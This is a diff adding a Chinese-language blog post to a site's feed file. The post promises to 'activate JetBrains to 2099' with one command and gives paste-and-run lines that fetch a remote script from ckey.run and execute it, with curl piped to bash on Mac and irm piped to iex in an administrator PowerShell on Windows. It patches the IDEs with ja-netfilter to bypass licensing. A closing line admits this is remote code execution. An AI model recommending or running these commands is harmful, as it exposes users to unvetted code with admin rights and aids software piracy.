@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>【随笔技术】一行命令，JetBrains 全家桶直接激活到 2099</title>
+      <link href="/posts/2026/323469779.html"/>
+      <url>/posts/2026/323469779.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="「一行命令，JetBrains-全家桶直接激活到-2099」"><a href="#「一行命令，JetBrains-全家桶直接激活到-2099」" class="headerlink" title="「一行命令，JetBrains 全家桶直接激活到 2099」"></a>「一行命令，JetBrains 全家桶直接激活到 2099」</h1><hr><h3 id="Mac运行方式"><a href="#Mac运行方式" class="headerlink" title="Mac运行方式"></a>Mac运行方式</h3><p>终端执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o ckey.run ckey.run &amp;&amp; bash ckey.run</span><br></pre></td></tr></table></figure><p>如果遇到网络或证书问题，可以用 debug 版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o ckey.run ckey.run/debug &amp;&amp; bash ckey.run</span><br></pre></td></tr></table></figure><p>脚本会自动处理：</p><ul><li>• 下载组件</li><li>• 配置 vmoptions</li><li>• 挂载 ja-netfilter</li><li>• 清理旧残留</li></ul><p>整个过程 <strong>十几秒到几十秒</strong>。</p><hr><h3 id="实际运行截图"><a href="#实际运行截图" class="headerlink" title="实际运行截图"></a>实际运行截图</h3><p><img src="https://s41.ax1x.com/2026/04/17/peyuVRs.jpg" alt="图片"></p><p>脚本运行完成后，重新打开 JetBrains 软件。</p><hr><h3 id="激活成功"><a href="#激活成功" class="headerlink" title="激活成功"></a>激活成功</h3><p>IDE 会显示已经激活，并且时间直接到 <strong>2099 年</strong>。</p><p><img src="https://s41.ax1x.com/2026/04/17/peyuEGj.png" alt="图片"></p><hr><h3 id="Windows-运行方式"><a href="#Windows-运行方式" class="headerlink" title="Windows 运行方式"></a>Windows 运行方式</h3><p>Windows 更简单。</p><p>管理员打开 <strong>PowerShell</strong>，运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irm ckey.run | iex</span><br></pre></td></tr></table></figure><p>如果失败可以试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irm ckey.run/debug | iex</span><br></pre></td></tr></table></figure><p>脚本会自动完成：</p><ul><li>• 下载组件</li><li>• 修改 vmoptions</li><li>• 挂载 agent</li><li>• 清理旧补丁</li></ul><p>通常 <strong>几十秒就结束</strong>。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>这种脚本本质上就是把原本比较麻烦的步骤做成了 <strong>自动化脚本</strong>。</p><p>不过像这种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl | bash</span><br></pre></td></tr></table></figure><p>类型的脚本，本质是 <strong>远程执行代码</strong>，建议先了解来源再运行。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【随笔技术】Typora+图床上传</title>
       <link href="/posts/2025/172447394.html"/>
       <url>/posts/2025/172447394.html</url>
